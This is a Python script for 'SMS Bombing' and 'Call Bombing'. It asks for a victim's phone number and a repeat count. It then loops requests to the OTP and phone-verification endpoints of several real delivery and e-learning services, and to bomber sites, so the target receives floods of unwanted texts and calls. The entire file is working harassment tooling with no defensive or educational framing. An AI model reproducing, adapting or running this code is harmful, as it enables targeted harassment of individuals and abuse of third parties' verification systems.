import requests
import time


phone_no=""
print("Choice available: \n 1: SMS Bombing \n 2: Call Bombing \n 3: Double Trouble ")
val = input("Enter your choice: ") 
val2 = input("Enter Phone no.: ") 
val3 = input("Enter no. of BOmbS: ") 
phone_no=val2

byju_no="+1-"+phone_no
headers_shadow = {
    'Host': 'api.shadowfax.in',
    'locale': 'en',
    'content-type': 'application/json; charset=utf-8',
    'user-agent': 'okhttp/3.12.0',
}
# 'device-id': 'fffffbff-93eb-a0cc-0010-020078b3d5kf',     can be used as headers 
    # 'authorization': 'Token',
data_shadow = '{"version":196,"allottedphone":'+phone_no+'}'


headers_byju = {
    
    'Content-Type': 'application/json; charset=UTF-8',
    'Host': 'marketing.tllms.com',
    'User-Agent': 'okhttp/3.14.2',
    'Accept': '*/*',
    
    
}
'''can be used as headers
'Cache-Control': 'no-cache',
'X-TNL-APPVERSION': '7981', 
    'X-TNL-APPID': '1',
    'X-TNL-FEATURES': 'quizzo;v=2,search;v=2',
    'Postman-Token': '1fc8273e-6ae7-4e02-b86d-7123cd07f202',
    '''
data_byju = '{"mobile":"'+byju_no+'"}'


swiggy_req_str="https://profile.swiggy.com/api/v2/app/call_otp?mobile="+phone_no




cookies_umm = {
    '__cfduid': 'd30169cc64281607f405211624d9985b61598704296',
}

headers_umm = {
    'authority': 'call.thebomber.me',
    'accept': '*/*',
    'x-requested-with': 'XMLHttpRequest',
    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.83 Safari/537.36',
    'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
    'origin': 'https://call.thebomber.me',
    'sec-fetch-site': 'same-origin',
    'sec-fetch-mode': 'cors',
    'sec-fetch-dest': 'empty',
    'accept-language': 'en-US,en;q=0.9',
    'Cache-Control': 'no-cache',
    'Postman-Token': 'c7e657bb-0298-4c06-956f-2b075a5980be',
    'Host': 'call.thebomber.me',
}

data_umm = 'no='+phone_no

headers_sms = {
    'authority': 'thebomber.io',
    'accept': '*/*',
    'x-requested-with': 'XMLHttpRequest',
    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.83 Safari/537.36',
    'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
    'origin': 'https://thebomber.io',
    'sec-fetch-site': 'same-origin',
    'sec-fetch-mode': 'cors',
    'sec-fetch-dest': 'empty',
    'referer': 'https://thebomber.io/',
    'accept-language': 'en-US,en;q=0.9',
    'cookie': '__cfduid=d6dbc9ebd34d4cc6d939ec25df777d1231597347315; _ga=GA1.2.1675837070.1597347318',
}

data_sms = {
  'no': phone_no
}


def sms_bomb():
    response = requests.post('https://thebomber.io/shh.php', headers=headers_sms, data=data_sms, verify=False)
    print(response)


def call_bomb():
    response = requests.post('https://api.shadowfax.in/app/v3/login/ivr_otp/', headers=headers_shadow, data=data_shadow, verify=False)
    print(response.content)
    time.sleep(5)
    response=requests.get(swiggy_req_str, verify=False)#Swiggy
    print(response.content)
    time.sleep(5)
    response = requests.post('https://marketing.tllms.com/elearn/api/v4/authentications/phone_call', headers=headers_byju, data=data_byju, verify=False)
    print(response.content)
    time.sleep(5)
    response = requests.post('https://call.thebomber.me/umm.php', headers=headers_umm, cookies=cookies_umm, data=data_umm, verify=False)
    print(response.content)
    time.sleep(5)

if(val=='1'):
    for i in range(0, int(val3)):
        sms_bomb()
        time.sleep(1) 


if(val=='2'):
    for i in range(0, int(val3)):
        call_bomb()
        time.sleep(1) 

if(val=='3'):
    for i in range(0, int(val3)):
        sms_bomb()
        time.sleep(1) 
        call_bomb()
        time.sleep(1) 

else:
    print("Wrogn CHOice")
